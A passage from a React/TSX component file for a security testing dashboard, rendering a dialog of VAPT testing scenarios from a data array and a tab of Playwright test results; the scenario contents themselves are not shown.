                    <Button variant="default" className="flex-1">
                      <CheckCircle className="h-4 w-4 mr-2" />
                      Mark as Resolved
                    </Button>
                  </div>
                </div>
              )}
            </DialogContent>
          </Dialog>

          {/* Best Practices Dialog */}
          <Dialog open={showBestPractices} onOpenChange={setShowBestPractices}>
            <DialogContent className="max-w-6xl max-h-[85vh] overflow-y-auto">
              <DialogHeader>
                <DialogTitle className="flex items-center gap-2">
                  <Info className="h-5 w-5 text-primary" />
                  Top 20 VAPT Testing Scenarios - Best Practices
                </DialogTitle>
              </DialogHeader>
              <div className="space-y-4 mt-4">
                <p className="text-sm text-muted-foreground">
                  Comprehensive security testing scenarios with detailed examples and testing steps for vulnerability assessment
                </p>
                <div className="grid gap-4">
                  {vaptBestPractices.map((scenario, index) => (
                    <Card key={scenario.id} className="bg-muted/5 border">
                      <CardContent className="p-5">
                        <div className="space-y-4">
                          <div className="flex items-start justify-between gap-4">
                            <div className="flex items-center gap-3">
                              <span className="text-xl font-bold text-primary">#{index + 1}</span>
                              <h4 className="font-semibold text-lg">{scenario.title}</h4>
                            </div>
                            <div className="flex items-center gap-2">
                              <Badge variant="outline" className="text-xs">{scenario.category}</Badge>
                              <Badge className={getSeverityColor(scenario.severity)}>
                                {scenario.severity.toUpperCase()}
                              </Badge>
                            </div>
                          </div>
                          
                          <p className="text-sm text-muted-foreground">{scenario.description}</p>
                          
                          <div className="space-y-2">
                            <Label className="text-sm font-semibold">Example & Explanation:</Label>
                            <div className="bg-muted/30 p-3 rounded-md">
                              <pre className="text-xs whitespace-pre-wrap font-mono text-foreground">
{scenario.example}
                              </pre>
                            </div>
                          </div>

                          <div className="space-y-2">
                            <Label className="text-sm font-semibold">Testing Steps:</Label>
                            <ul className="space-y-1.5">
                              {scenario.testingSteps.map((step, stepIndex) => (
                                <li key={stepIndex} className="text-sm text-muted-foreground flex items-start gap-2">
                                  <span className="text-primary font-medium mt-0.5">{stepIndex + 1}.</span>
                                  <span>{step}</span>
                                </li>
                              ))}
                            </ul>
                          </div>
                        </div>
                      </CardContent>
                    </Card>
                  ))}
                </div>
              </div>
            </DialogContent>
          </Dialog>

          <TabsContent value="results" className="space-y-6">
            <Card className="bg-gradient-card shadow-soft border-0">
              <CardHeader>
                <CardTitle>Test Execution Results</CardTitle>
                <CardDescription>
                  Detailed results from Playwright test execution with screenshots
                </CardDescription>
              </CardHeader>
              <CardContent>
                <div className="grid gap-4">
                  {testCases
                    .filter(test => test.status !== "pending")
                    .map((testCase) => (
                    <div key={testCase.id} className="flex items-center justify-between p-4 bg-muted/5 rounded-lg border">
                      <div className="flex items-center gap-3">
                        {getStatusIcon(testCase.status)}
                        <div>
                          <h4 className="font-medium">{testCase.name}</h4>
                          <div className="flex items-center gap-4 text-sm text-muted-foreground">
                            <span>Duration: {testCase.duration}s</span>
                            <span>Last run: {testCase.lastRun}</span>
                          </div>
                        </div>
                      </div>
                      <div className="flex items-center gap-2">
                        <Badge className={getStatusColor(testCase.status)}>
                          {testCase.status}
                        </Badge>
                        {testCase.screenshot && (
                          <Button variant="ghost" size="sm">
                            <Image className="h-4 w-4" />
                          </Button>
                        )}
                      </div>
                    </div>
                  ))}
                </div>
              </CardContent>
            </Card>
          </TabsContent>
        </Tabs>
      </div>
    </div>
  );
};

export default TestAgent;